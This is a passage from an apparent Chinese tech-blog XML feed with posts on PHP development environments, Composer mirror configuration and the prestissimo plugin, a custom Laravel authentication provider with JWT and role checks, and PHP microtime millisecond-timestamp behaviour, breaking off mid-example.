:)</p><p>laradock是PHP集成环境docker化一个方案，通过内置开发环境所需的dockerfile文件进行自动构建；该项目目前github拥有星星7k+的状态，仓库内置许多服务的dockerfile可以用来学习某些服务dockerfile写法，推荐学习下</p><h2 id="结论"><a href="#结论" class="headerlink" title="#结论?"></a>#结论?</h2><p>由于每个人的喜好不同，开发习惯也不同。如果想自由些，推荐phpbrew+docker开发PHP项目；企业级想强制规范开发环境可以使用homestead方案。<br>对于windows环境下的开发者，笔者建议下载virtualbox安装debian环境进行日常开发，毕竟windows下开发会存在很多诡异问题。</p><p><em>或许几年后又流行XX方案呢？一切都只是趋势下的产物</em></p><h2 id="参考"><a href="#参考" class="headerlink" title="#参考"></a>#参考</h2><p><a href="https://www.vagrantup.com/docs/index.html">vagrantup文档</a><br><a href="https://laravel.com/docs/5.8/homestead">Homestead文档</a><br><a href="https://github.com/phpbrew/phpbrew">phpbrew仓库</a><br><a href="https://laradock.io/introduction/">laradock文档</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpbrew </tag>
            
            <tag> laradock </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>composer加速</title>
      <link href="2019/07/07/composer%E5%8A%A0%E9%80%9F/"/>
      <url>2019/07/07/composer%E5%8A%A0%E9%80%9F/</url>
      
        <content type="html"><![CDATA[<p>composer官方在<code>2020-10-24</code>发布composer2，包处理能力整体提升不少；同时<code>prestissimo</code>项目推荐使用composer2, 并且支持范围限定在2.0以下版本。官方博客中提到composer2.x虽然支持<code>PHP5.6</code>等低版本，后续composer2.x版本会要求PHP在<code>7.0</code>以上主流版本；推荐升级PHP版本，毕竟<code>PHP8</code>都出来了。</p><p>composer2升级:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer self-update --2</span><br></pre></td></tr></table></figure><p>composer2新增<code>runtime</code>特性，其中<code>plaform check</code>功能会检查当前PHP版本，如果PHP版本符合包的要求会报错，具体特性参考<a href="https://blog.packagist.com/composer-2-0-is-now-available/">官方博客</a></p><p><font color="#dd0000">注意：阿里云和腾讯云composer镜像存在一定几率异常，优先使用官方镜像 </font></p><hr><p>composer是PHP项目包管理利器，由于墙的原因导致包下载速度缓慢；composer全量镜像主要有phpcomposer、<del>laravel-china</del>和新开放的阿里云。阿里云最近开放composer镜像仓库，大大减少包下载的速度。笔者推荐阿里云+prestissimo组合方式。</p><p>腾讯云也跟随阿里的脚步开放composer全量镜像仓库, <a href="https://mirrors.cloud.tencent.com/help/composer.html">官网配置</a>, 阿里的composer偶尔也会抽筋，可能与本地网络有关 :)</p><p>laravel-china全量镜像仓库将会在两个月左右关闭，具体移步<a href="https://learnku.com/articles/30758">阅读</a>。</p><h2 id="阿里云composer配置"><a href="#阿里云composer配置" class="headerlink" title="#阿里云composer配置"></a>#阿里云composer配置</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">全局安装(推荐): composer config -g repo.packagist composer https:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/composer/</span></span><br><span class="line"></span><br><span class="line">取消配置: composer config -g --unset repos.packagist</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里使用composer下载包时使用-vvv参数显示进度详情，能有有一个直观的体现。</p><h2 id="prestissimo并发加速"><a href="#prestissimo并发加速" class="headerlink" title="#prestissimo并发加速"></a>#prestissimo并发加速</h2><p>prestissimo是一个并发下载的composer插件，通过使用curl_multi*系列方法并发请求包，一定程度节约时间。</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装: composer <span class="keyword">global</span> <span class="keyword">require</span> hirak/prestissimo</span><br><span class="line">卸载: composer <span class="keyword">global</span> <span class="keyword">remove</span> hirak/prestissimo</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="#参考:"></a>#参考:</h2><ol><li><a href="https://github.com/hirak/prestissimo">prestissimo仓库</a></li><li><a href="https://mirrors.aliyun.com/composer">阿里云Composer全量镜像</a></li><li><a href="https://mirrors.cloud.tencent.com/composer/">腾讯云Composer全量镜像</a></li><li><a href="https://blog.packagist.com/composer-2-0-is-now-available/">composer2</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> composer </tag>
            
            <tag> prestissimo </tag>
            
            <tag> composer2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel自定义认证</title>
      <link href="2019/06/02/laravel%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AE%A4%E8%AF%81/"/>
      <url>2019/06/02/laravel%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AE%A4%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<p>laravel自带用户认证基本满足简单业务需求，如果要开发API接口则需要引入jwt认证组件。jwt组件的配置参考<a href="https://learnku.com/articles/10885/full-use-of-jwt">JWT 完整使用详解</a>, 本文主要记录下围绕API与JWT认证一些使用技巧。</p><h2 id="0x1-自定义认证"><a href="#0x1-自定义认证" class="headerlink" title="0x1 自定义认证"></a>0x1 自定义认证</h2><p>如果用户认证使用一些三方的认证服务，应该如何处理呢？Laravel提供自定义的认证的入口，通过Provider形式替代原有的认证逻辑。</p><ul><li><p>注册自定义认证方法:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app/Providers/AuthServiceProvider.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//省略...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Register any authentication / authorization services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;registerPolicies();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//注册DIYUserServiceProvider</span></span><br><span class="line">        Auth::provider(<span class="string">&quot;DIY&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$app</span>, <span class="keyword">array</span> <span class="variable">$config</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> DIYUserServiceProvider(<span class="variable">$app</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>修复配置:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#config/auth.php</span></span><br><span class="line">   <span class="string">&#x27;providers&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;users&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;DIY&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">    ],</span><br></pre></td></tr></table></figure></li><li><p>生成provider文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:provider DIYUserServiceProvider</span><br></pre></td></tr></table></figure></li><li><p>实现DIYUserServiceProvider方法:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app/Providers/DIYUserServiceProvider.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Providers</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Auth</span>\<span class="title">UserProvider</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">ServiceProvider</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Auth</span>\<span class="title">Authenticatable</span> <span class="title">as</span> <span class="title">UserContract</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">User</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">DIYUserService</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DIYUserServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span> <span class="keyword">implements</span> <span class="title">UserProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Retrieve a user by their unique identifier.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  mixed  $identifier</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Illuminate\Contracts\Auth\Authenticatable|null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">retrieveById</span>(<span class="params"><span class="variable">$identifier</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">// 根据认证信息获取用户信息</span></span><br><span class="line">        <span class="variable">$user</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//App\User对象增加Model属性attributes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User([<span class="string">&#x27;attributes&#x27;</span> =&gt; <span class="variable">$user</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Retrieve a user by their unique identifier and &quot;remember me&quot; token.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  mixed  $identifier</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string  $token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Illuminate\Contracts\Auth\Authenticatable|null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">retrieveByToken</span>(<span class="params"><span class="variable">$identifier</span>, <span class="variable">$token</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User(<span class="variable">$identifier</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Update the &quot;remember me&quot; token for the given user in storage.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  \Illuminate\Contracts\Auth\Authenticatable  $user</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string  $token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">updateRememberToken</span>(<span class="params">UserContract <span class="variable">$user</span>, <span class="variable">$credentials</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Retrieve a user by the given credentials.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  array  $credentials</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Illuminate\Contracts\Auth\Authenticatable|null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">retrieveByCredentials</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$credentials</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="keyword">new</span> User(<span class="variable">$credentials</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Validate a user against the given credentials.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  \Illuminate\Contracts\Auth\Authenticatable  $user</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  array  $credentials</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validateCredentials</span>(<span class="params">UserContract <span class="variable">$user</span>, <span class="keyword">array</span> <span class="variable">$credentials</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$credentials</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$credentials</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实现用户认证</span></span><br><span class="line">        <span class="keyword">return</span> DIYUserService::auth(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>User模型<br>认证方法调用过程中都会使用到<code>App\User</code>这个类文件，jwt在这个类中增加<code>getJWTIdentifier</code>和<code>getJWTCustomClaims</code>方法。DIYUserServiceProvider方法需要将部分认证信息赋予到User类。在后续使用Laravel-permission组件时也需要增加特定方法。</p></li></ul><h2 id="0x2-API鉴权"><a href="#0x2-API鉴权" class="headerlink" title="0x2 API鉴权"></a>0x2 API鉴权</h2><p>业务模块不同，用户角色不同可以通过laravel-permission权限组件完成对用户接口调用权限的识别。laravel-permission组件是entrust组件的替代品，也是通过role、permission和model对用户权限控制。</p><p>laravel-permission组件:</p><ul><li>基础使用<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建角色、权限</span></span><br><span class="line"><span class="variable">$role</span> = Role::create([<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;admin&#x27;</span>]);</span><br><span class="line"><span class="variable">$permissions</span> = [</span><br><span class="line">    Permission::create([<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;user-manage&#x27;</span>]),</span><br><span class="line">    Permission::create([<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;role-manage&#x27;</span>]),</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$role</span>-&gt;syncPermissions(<span class="variable">$permissions</span>);</span><br></pre></td></tr></table></figure></li><li>API限制<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#路由配置</span></span><br><span class="line">Route::group([<span class="string">&#x27;middleware&#x27;</span> =&gt; <span class="string">&#x27;role:admin&#x27;</span>], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">#User类实现判断方法(App\User.php)</span></span><br><span class="line"><span class="comment">#该方法需要单独添加, v5.8版本中没有hasAnyRole该方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasAnyRole</span>(<span class="params"><span class="variable">$roles</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">$this</span>-&gt;getAttribute(<span class="string">&#x27;attributes&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$roles</span> <span class="keyword">as</span> <span class="variable">$role</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$role</span> !== <span class="variable">$user</span>[<span class="string">&#x27;roles&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x3-总结"><a href="#0x3-总结" class="headerlink" title="0x3 总结"></a>0x3 总结</h2><p>laravel的生态系统丰富，各种各样组件都存在；使用不同的组件排列组合实现不同的功能，虽然laravel号称最优雅的框架，但是内部逻辑复杂难懂。</p><p>本文由于笔者能力有限，不足之处欢迎留言探讨。</p><h2 id="0x4-参考"><a href="#0x4-参考" class="headerlink" title="0x4 参考"></a>0x4 参考</h2><p><a href="https://learnku.com/docs/laravel/5.8/authentication/3906">laravel用户认证文档</a><br><a href="https://docs.spatie.be/laravel-permission/v2">laravel-permission文档</a>    </p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> jwt </tag>
            
            <tag> laravel-permission </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>microtime毫秒时间戳陷阱</title>
      <link href="2019/05/30/microtime%E6%AF%AB%E7%A7%92%E6%97%B6%E9%97%B4%E6%88%B3%E9%99%B7%E9%98%B1/"/>
      <url>2019/05/30/microtime%E6%AF%AB%E7%A7%92%E6%97%B6%E9%97%B4%E6%88%B3%E9%99%B7%E9%98%B1/</url>
      
        <content type="html"><![CDATA[<p>毫秒时间戳是API开发过程中使用的一种时间格式，PHP语言通过microtime函数获取机器的时间戳；microtime函数底层依赖C语言的gettimeofday函数获取数据。毫秒时间戳是一个13位长度的整型数据。由于PHP语言特性，mictotime毫秒部分长度不固定，省略了0的部分，错误的使用会导致获取的毫秒时间戳长度异常。</p><h2 id="时间转换科普"><a href="#时间转换科普" class="headerlink" title="#时间转换科普"></a>#时间转换科普</h2><ul><li>毫秒 (ms)</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>秒 = <span class="number">1000</span>毫秒</span><br><span class="line"><span class="attribute">1</span>毫秒 = <span class="number">0</span>.<span class="number">001</span>秒</span><br></pre></td></tr></table></figure><ul><li>微秒 (us)</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>秒 = <span class="number">1000000</span>微秒</span><br><span class="line"><span class="attribute">1</span>毫秒 = <span class="number">1000</span>微秒</span><br></pre></td></tr></table></figure><h2 id="毫秒时间戳"><a href="#毫秒时间戳" class="headerlink" title="#毫秒时间戳"></a>#毫秒时间戳</h2><ul><li>示例代码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$time</span> = explode(<span class="string">&quot;.&quot;</span>, microtime(<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理毫秒部分</span></span><br><span class="line"><span class="variable">$time</span>[<span class="number">0</span>] = <span class="variable">$time</span>[<span class="number">0</span>] * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$microtime</span> = <span class="variable">$time</span>[<span class="number">0</span>] + substr(<span class="variable">$time</span>[<span class="number">1</span>], <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="variable">$microtime</span>); <span class="comment">//输出: 1559197645889</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于microtime函数返回的毫秒部分是<strong>4位</strong>，gettimeofday函数返回的毫秒部分是<strong>6位</strong>；所以系统对时间精确度要求高的地方应该注意。</p><h2 id="microtime函数实现"><a href="#microtime函数实现" class="headerlink" title="#microtime函数实现"></a>#microtime函数实现</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#ext/standard/microtime.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//原型</span></span><br><span class="line">PHP_FUNCTION(microtime)</span><br><span class="line">&#123;</span><br><span class="line">_php_gettimeofday(INTERNAL_FUNCTION_PARAM_PASSTHRU, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _php_gettimeofday(INTERNAL_FUNCTION_PARAMETERS, <span class="keyword">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">zend_bool get_as_float = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tp</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">Z_PARAM_OPTIONAL</span><br><span class="line">Z_PARAM_BOOL(get_as_float)</span><br><span class="line">ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (gettimeofday(&amp;tp, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//microtime参数为true</span></span><br><span class="line"><span class="keyword">if</span> (get_as_float) &#123;</span><br><span class="line">RETURN_DOUBLE((<span class="keyword">double</span>)(tp.tv_sec + tp.tv_usec / MICRO_IN_SEC));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mode) &#123;</span><br><span class="line"><span class="comment">//省略...</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">RETURN_NEW_STR(zend_strpprintf(<span class="number">0</span>, <span class="string">&quot;%.8F %ld&quot;</span>, tp.tv_usec / MICRO_IN_SEC, (<span class="keyword">long</span>)tp.tv_sec));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>gettimeofday函数对比实现</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># demo.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">microtime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span></span><br><span class="line"></span><br><span class="line">gettimeofday(&amp;tv, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> php_time;</span><br><span class="line"><span class="comment">//PHP时间格式</span></span><br><span class="line">php_time = (<span class="keyword">double</span>)(tv.tv_sec + tv.tv_usec / <span class="number">1000000.00</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;tv_sec: %ld, tv_usec: %d, php_time: %f\n&quot;</span>, tv.tv_sec, tv.tv_usec, php_time);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">microtime();</span><br><span class="line"></span><br><span class="line">usleep(<span class="number">300</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过了解microtime函数的实现，其实可以发现PHP变量类型double会自动省略小数后面的0</p><ul><li>示例代码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 